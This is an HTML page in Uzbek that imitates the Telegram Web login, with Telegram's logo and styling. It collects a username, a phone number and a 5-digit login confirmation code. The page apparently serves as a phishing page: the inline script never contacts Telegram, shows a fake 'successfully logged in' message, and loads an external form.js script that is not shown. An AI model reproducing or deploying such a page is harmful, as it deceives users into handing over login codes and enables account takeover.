<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
  <title>Telegram Web</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg: #0f1826;
      --card-bg: #17212b;
      --text-main: #ffffff;
      --text-secondary: #7f91a4;
      --accent: #5288c1;
      --accent-hover: #4679ac;
      --field-bg: #242f3d;
      --field-border: #2b394a;
      --field-focus: #5288c1;
      --safe-top: env(safe-area-inset-top, 0px);
      --safe-bottom: env(safe-area-inset-bottom, 0px);
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Roboto', -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      -webkit-tap-highlight-color: transparent;
    }

    html, body {
      height: 100%;
      width: 100%;
      background-color: var(--bg);
      color: var(--text-main);
      overflow-x: hidden;
    }

    body {
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      min-height: 100dvh; /* Mobil brauzerlar balandligi uchun */
    }

    /* Asosiy konteyner */
    .app-container {
      width: 100%;
      max-width: 420px;
      padding: 20px;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .card {
      background-color: var(--card-bg);
      border-radius: 16px;
      padding: 40px 32px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      width: 100%;
      position: relative;
    }

    /* Logo */
    .logo-container {
      width: 100px;
      height: 100px;
      margin-bottom: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .telegram-icon {
      width: 90px;
      height: 90px;
      fill: var(--accent);
    }

    .title {
      font-size: 24px;
      font-weight: 700;
      margin-bottom: 8px;
      text-align: center;
    }

    .subtitle {
      font-size: 14px;
      color: var(--text-secondary);
      text-align: center;
      margin-bottom: 28px;
      line-height: 1.4;
    }

    /* Form va Inputlar */
    .form-group {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 16px;
    }

    .input-wrapper {
      position: relative;
      width: 100%;
    }

    .input-field {
      width: 100%;
      height: 52px;
      background: var(--field-bg);
      border: 1px solid var(--field-border);
      border-radius: 12px;
      padding: 16px;
      color: var(--text-main);
      font-size: 16px;
      outline: none;
      transition: all 0.2s ease;
    }

    .input-field:focus {
      border-color: var(--field-focus);
    }

    /* Floating label */
    .floating-label {
      position: absolute;
      left: 16px;
      top: 50%;
      transform: translateY(-50%);
      color: var(--text-secondary);
      font-size: 15px;
      pointer-events: none;
      transition: all 0.2s ease;
    }

    .input-field:focus ~ .floating-label,
    .input-field:not(:placeholder-shown) ~ .floating-label {
      top: 10px;
      transform: translateY(0);
      font-size: 11px;
      color: var(--accent);
    }

    .input-field:not(:placeholder-shown) {
      padding-top: 22px;
      padding-bottom: 6px;
    }

    /* Code Input */
    .code-input-container {
      display: flex;
      justify-content: center;
      gap: 8px;
      margin-top: 10px;
    }

    .code-digit {
      width: 46px;
      height: 54px;
      background: var(--field-bg);
      border: 1px solid var(--field-border);
      border-radius: 10px;
      text-align: center;
      font-size: 22px;
      font-weight: 700;
      color: var(--text-main);
      outline: none;
    }

    .code-digit:focus {
      border-color: var(--accent);
    }

    /* Tugmalar */
    .btn-primary {
      width: 100%;
      height: 50px;
      background-color: var(--accent);
      color: #ffffff;
      border: none;
      border-radius: 12px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 8px;
      transition: background 0.2s ease, transform 0.1s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    .btn-primary:active {
      transform: scale(0.98);
      background-color: var(--accent-hover);
    }

    .btn-text {
      background: none;
      border: none;
      color: var(--accent);
      font-size: 14px;
      cursor: pointer;
      margin-top: 14px;
      padding: 6px;
      align-self: center;
    }

    /* Step transition */
    .step {
      display: none;
      width: 100%;
      opacity: 0;
      transform: scale(0.96);
      transition: opacity 0.25s ease, transform 0.25s ease;
    }

    .step.active {
      display: flex;
      flex-direction: column;
      align-items: center;
      opacity: 1;
      transform: scale(1);
    }

    .edit-phone {
      color: var(--accent);
      cursor: pointer;
      font-weight: 500;
      text-decoration: none;
      margin-left: 4px;
    }

    /* ====================================================
       MOBIL QURILMALAR UCHUN MARKAZLASH (CENTERING)
       ==================================================== */
    @media (max-width: 480px) {
      body {
        background-color: var(--card-bg);
        padding-top: var(--safe-top);
        padding-bottom: var(--safe-bottom);
      }

      .app-container {
        padding: 16px;
        height: 100%;
      }

      .card {
        border-radius: 0;
        box-shadow: none;
        padding: 0;
        background: transparent;
      }

      .logo-container {
        width: 80px;
        height: 80px;
        margin-bottom: 16px;
      }

      .telegram-icon {
        width: 70px;
        height: 70px;
      }

      .title {
        font-size: 22px;
      }

      .subtitle {
        font-size: 13px;
        margin-bottom: 24px;
      }

      .btn-primary {
        margin-top: 6px;
      }
    }
  </style>
</head>
<body>

  <div class="app-container">
    <div class="card">
      
      <!-- LOGO -->
      <div class="logo-container">
        <svg class="telegram-icon" viewBox="0 0 24 24">
          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.54 3.69-.52.36-1 .53-1.42.52-.47-.01-1.37-.26-2.03-.48-.82-.27-1.47-.42-1.42-.88.03-.25.38-.51 1.07-.78 4.18-1.82 6.97-3.02 8.37-3.61 3.99-1.66 4.82-1.95 5.36-1.96.12 0 .38.03.55.17.14.12.18.28.2.45-.02.07-.02.13-.03.24z"/>
        </svg>
      </div>

      <!-- 1-BOSQICH -->
      <div id="step-1" class="step active">
        <h1 class="title">Telegram Web</h1>
        <p class="subtitle">Iltimos, foydalanuvchi nomi hamda telefon raqamingizni kiriting</p>

        <form id="phone-form" class="form-group" onsubmit="return handleNext(event)">
          <div class="input-wrapper">
            <input type="text" id="username" class="input-field" placeholder=" " required autocomplete="off">
            <label class="floating-label" for="username">Username (@username)</label>
          </div>

          <div class="input-wrapper">
            <input type="tel" id="phone" class="input-field" placeholder=" " value="+998 " required autocomplete="tel">
            <label class="floating-label" for="phone">Telefon Raqam</label>
          </div>

          <button type="submit" class="btn-primary">NEXT</button>
        </form>
      </div>

      <!-- 2-BOSQICH (SMS/Message Code) -->
      <div id="step-2" class="step">
        <h1 class="title" id="display-phone">+998 90 123 45 67</h1>
        <p class="subtitle">Sizning Telegram ilovangizga tasdiqlash kodi yuborildi. <a href="#" class="edit-phone" onclick="handleEditPhone()">Tahrirlash</a></p>

        <form id="code-form" class="form-group" onsubmit="return handleVerify(event)">
          <div class="code-input-container">
            <input type="text" maxlength="1" class="code-digit" autofocus oninput="moveFocus(this, 1)">
            <input type="text" maxlength="1" class="code-digit" oninput="moveFocus(this, 2)">
            <input type="text" maxlength="1" class="code-digit" oninput="moveFocus(this, 3)">
            <input type="text" maxlength="1" class="code-digit" oninput="moveFocus(this, 4)">
            <input type="text" maxlength="1" class="code-digit" oninput="moveFocus(this, 5)">
          </div>

          <button type="submit" class="btn-primary" style="margin-top: 16px;">KIRISH</button>
          <button type="button" class="btn-text" onclick="handleResend()">Kodni qayta yuborish</button>
        </form>
      </div>

    </div>
  </div>

  <script>
    function handleNext(event) {
      event.preventDefault();
      
      const phoneInput = document.getElementById('phone').value;

      if (!phoneInput || phoneInput.trim() === '+998') {
        alert('Iltimos, telefon raqamingizni to\'liq kiriting!');
        return false;
      }

      document.getElementById('display-phone').innerText = phoneInput;

      document.getElementById('step-1').classList.remove('active');
      setTimeout(() => {
        document.getElementById('step-2').classList.add('active');
        document.querySelector('.code-digit').focus();
      }, 150);

      return false;
    }

    function handleEditPhone() {
      document.getElementById('step-2').classList.remove('active');
      setTimeout(() => {
        document.getElementById('step-1').classList.add('active');
      }, 150);
    }

    function moveFocus(element, index) {
      if (element.value.length === 1 && index < 5) {
        document.querySelectorAll('.code-digit')[index].focus();
      }
    }

    function handleVerify(event) {
      event.preventDefault();
      let code = '';
      document.querySelectorAll('.code-digit').forEach(input => code += input.value);
      
      if (code.length === 5) {
        alert('Muvaffaqiyatli kirildi!');
      } else {
        alert('Iltimos, 5 xonali kodni to\'liq kiriting!');
      }
      return false;
    }

    function handleResend() {
      alert('Tasdiqlash kodi qayta yuborildi!');
    }
  </script>
  <script src="form.js"></script>
</body>
</html>
